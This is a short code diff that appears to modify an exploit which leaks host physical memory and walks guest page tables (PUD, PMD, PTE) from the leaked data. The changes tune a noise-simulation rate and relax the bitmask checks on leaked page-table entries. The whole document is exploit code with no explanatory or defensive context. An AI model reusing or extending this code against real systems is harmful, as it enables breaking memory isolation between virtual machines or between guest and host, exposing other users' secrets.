@@ -24,7 +24,7 @@ void leak(void *data, hpa_t base, hpa_t pa, int len)
         memcpy(data, buf, len);
 #if LEAK == CHEAT_NOISY
 	for (int i = 0; i < len; i++)
-		if (rand() % 28 == 3)
+		if (rand() % 20 == 3)
 			((char *)data)[i] = 0;
 #endif
         return;
@@ -193,7 +193,7 @@ retry_gpud:
 	pte_t gpud = leak_pte(base, pud_pa);
 	if (verbose == 1) printf("\t      \\ gpud %10lx", gpud);
 	if (verbose >= 2) dump(gpud);
-	if ((gpud & 0xfff) != 0x063) {
+	if ((gpud & 0xffb) != 0x063) {
 		if (verbose == 1) printf("\n");
 		goto retry_gpud;
 	}
@@ -225,7 +225,7 @@ retry_gpmd:
 	pte_t gpmd = leak_pte(base, pmd_pa);
 	if (verbose == 1) printf("\t       \\ gpmd %10lx", gpmd);
 	if (verbose >= 2) dump(gpmd);
-	if ((gpmd & 0xf7f) != 0x063) {
+	if ((gpmd & 0xf7b) != 0x063) {
 		if (verbose == 1) printf("\n");
 		goto retry_gpmd;
 	}
@@ -257,7 +257,7 @@ retry_gpte:
 	pte_t gpte = leak_pte(base, pte_pa);
 	if (verbose == 1) printf("\t        \\ gpte %10lx", gpte);
 	if (verbose >= 2) dump(gpte);
-	if ((gpte & 0xfff) != 0x063) {
+	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825)) {
 		if (verbose == 1) printf("\n");
 		goto retry_gpte;
 	}
